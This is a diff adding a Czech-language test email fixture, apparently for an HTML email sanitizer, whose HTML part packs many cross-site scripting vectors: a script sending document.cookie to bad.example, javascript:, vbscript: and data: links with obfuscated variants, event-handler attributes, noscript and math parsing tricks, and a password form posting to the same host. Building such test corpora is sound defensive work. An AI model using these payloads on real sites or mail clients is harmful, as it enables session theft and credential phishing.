@@ -1,0 +1,51 @@
+From: =?utf-8?q?Podvodn=C3=ADk?= <scam@bad.example>
+To: Tester <tester@example.test>
+Subject: =?utf-8?q?V=C3=BDhra!_Klikn=C4=9Bte?= zde
+Date: Tue, 10 Nov 2026 09:12:00 +0100
+Message-ID: <907682969689387550@example.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============4838472454235470111=="
+
+--===============4838472454235470111==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+text
+
+--===============4838472454235470111==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><head><meta http-equiv=3D"refresh" content=3D"0;url=3Dhttps://bad.examp=
+le/redirect">
+<base href=3D"https://bad.example/"><script>alert('x');document.location=3D'h=
+ttps://bad.example/steal?c=3D'+document.cookie</script>
+<style>body{background:url(http://127.0.0.1:9/bg.png)} .x{behavior:url(x.htc)=
+}</style></head>
+<body onload=3D"alert(1)">
+<h2 onclick=3D"alert(2)">Gratulujeme</h2>
+<p>Text zpr=C3=A1vy <a href=3D"javascript:alert(3)">javascript odkaz</a>, <a =
+href=3D"jav&#x61;script:alert(4)">schovan=C3=BD</a>,
+<a href=3D" JaVaScRiPt:alert(5)">velk=C3=A1 p=C3=ADsmena</a>, <a href=3D"data=
+:text/html;base64,PHNjcmlwdD5hbGVydCg2KTwvc2NyaXB0Pg=3D=3D">data</a>,
+<a href=3D"vbscript:msgbox(7)">vbscript</a>, <a href=3D"https://legit.example=
+.org/ok">bezpe=C4=8Dn=C3=BD odkaz</a>.</p>
+<img src=3D"x" onerror=3D"alert(8)"><img src=3D"http://127.0.0.1:9/track.gif"=
+ width=3D"1" height=3D"1">
+<iframe src=3D"https://bad.example/frame"></iframe><object data=3D"https://ba=
+d.example/x.swf"></object><embed src=3D"x.swf">
+<form action=3D"https://bad.example/login" method=3D"post"><input name=3D"pas=
+sword" type=3D"password"><button>P=C5=99ihl=C3=A1sit</button></form>
+<svg onload=3D"alert(9)"><script>alert(10)</script></svg>
+<div style=3D"width:expression(alert(11))">expression</div>
+<a href=3D"https://legit.example.org/" onmouseover=3D"alert(12)" style=3D"col=
+or:red">hover</a>
+<math><mtext><script>alert(13)</script></mtext></math>
+<noscript><p title=3D"</noscript><img src=3Dx onerror=3Dalert(14)>">noscript<=
+/p></noscript>
+<p>Konec ZAKERNE_KONEC</p>
+</body></html>
+
+--===============4838472454235470111==--
